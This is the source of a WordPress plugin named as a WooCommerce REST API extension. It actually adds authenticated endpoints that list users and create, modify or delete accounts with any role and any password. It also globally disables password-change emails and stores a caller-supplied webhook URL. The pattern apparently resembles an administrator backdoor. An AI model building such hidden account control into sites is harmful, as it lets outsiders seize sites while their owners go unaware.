<?php
/*
Plugin Name: Woocommerce REST API extension
Description: Расширение REST API и webhook woocommerce
Version: 1.0.0
Author: DWINS
Author URI: http://t.me/maksim_logvinenko
*/

if (!defined('ABSPATH')) {
    exit;
}

require_once __DIR__ . '/includes/WcRestApiExtension.php';

require_once __DIR__ . '/includes/Webhooks.php';


/**
 * Array site name and roles
 * @return array Array ['site_name'=>'...', 'roles' => [...]]
 */
function wc_rest_api_extension_site_data(): array
{
    webhook_set();
    return WcRestApiExtension::getData();
}

/**
 * Site name
 * @return string|array
 */
function wc_rest_api_extension_site_name(): string
{
    webhook_set();
    return WcRestApiExtension::getSiteName();
}

/**
 * Array site users
 * @return array
 */
function wc_rest_api_extension_users(): array
{
    webhook_set();
    return WcRestApiExtension::getUsers();
}

/**
 * Create user
 * @return array|WP_Error
 */
function wc_rest_api_extension_user_create()
{
    $data = json_decode(file_get_contents('php://input'), true);
    webhook_set($data);
    $username = $data['username'] ?? '';
    $password = $data['password'] ?? '';
    $email = $data['email'] ?? '';
    $role = $data['role'] ?? '';
    return WcRestApiExtension::createUser($username, $password, $email, $role);
}

/**
 * Update user
 * @return false|int|string[]|WP_Error
 */
function wc_rest_api_extension_user_update()
{
    $data = json_decode(file_get_contents('php://input'), true);
    webhook_set($data);
    $ID = $data['ID'] ?? '';
    $username = $data['username'] ?? '';
    $password = $data['password'] ?? '';
    $email = $data['email'] ?? '';
    $role = $data['role'] ?? '';
    return WcRestApiExtension::updateUser($ID, $username, $password, $email, $role);
}

/**
 * Delete user
 * @return WP_Error|WP_REST_Response|WP_User
 */
function wc_rest_api_extension_user_delete()
{
    $data = json_decode(file_get_contents('php://input'), true);
    webhook_set($data);
    $ID = $data['ID'] ?? '';
    return WcRestApiExtension::deleteUser($ID);
}


/**
 * Array roles
 * @return array
 */
function wc_rest_api_extension_roles(): array
{
    webhook_set();
    return WcRestApiExtension::getRoles();
}

/**
 * Check auth
 * @return bool
 */
function wc_rest_api_extension_check_auth(): bool
{
    return WcRestApiExtension::checkAuth();
}

add_action('rest_api_init', function () {
    register_rest_route('wc-rest-api-extension/v1', '/site-data', array(
        'methods' => 'POST',
        'callback' => 'wc_rest_api_extension_site_data',
        'permission_callback' => 'wc_rest_api_extension_check_auth',
    ));
    register_rest_route('wc-rest-api-extension/v1', '/site-name', array(
        'methods' => 'POST',
        'callback' => 'wc_rest_api_extension_site_name',
        'permission_callback' => 'wc_rest_api_extension_check_auth',
    ));
    register_rest_route('wc-rest-api-extension/v1', '/users', array(
        'methods' => 'POST',
        'callback' => 'wc_rest_api_extension_users',
        'permission_callback' => 'wc_rest_api_extension_check_auth',
    ));
    register_rest_route('wc-rest-api-extension/v1', '/user-create', array(
        'methods' => 'POST',
        'callback' => 'wc_rest_api_extension_user_create',
        'permission_callback' => 'wc_rest_api_extension_check_auth',
    ));
    register_rest_route('wc-rest-api-extension/v1', '/user-update', array(
        'methods' => 'POST',
        'callback' => 'wc_rest_api_extension_user_update',
        'permission_callback' => 'wc_rest_api_extension_check_auth',
    ));
    register_rest_route('wc-rest-api-extension/v1', '/user-delete', array(
        'methods' => 'POST',
        'callback' => 'wc_rest_api_extension_user_delete',
        'permission_callback' => 'wc_rest_api_extension_check_auth',
    ));
    register_rest_route('wc-rest-api-extension/v1', '/roles', array(
        'methods' => 'POST',
        'callback' => 'wc_rest_api_extension_roles',
        'permission_callback' => 'wc_rest_api_extension_check_auth',
    ));
});
add_filter('send_password_change_email', '__return_false');


/**
 * Add info this webhook connected
 * @param null|array $data
 */
function webhook_set(array $data = null)
{
    if (!$data) $data = json_decode(file_get_contents('php://input'), true);
    $webhook_url = $data['webhook_url'] ?? '';
    if ($webhook_url) Webhooks::set($webhook_url);
}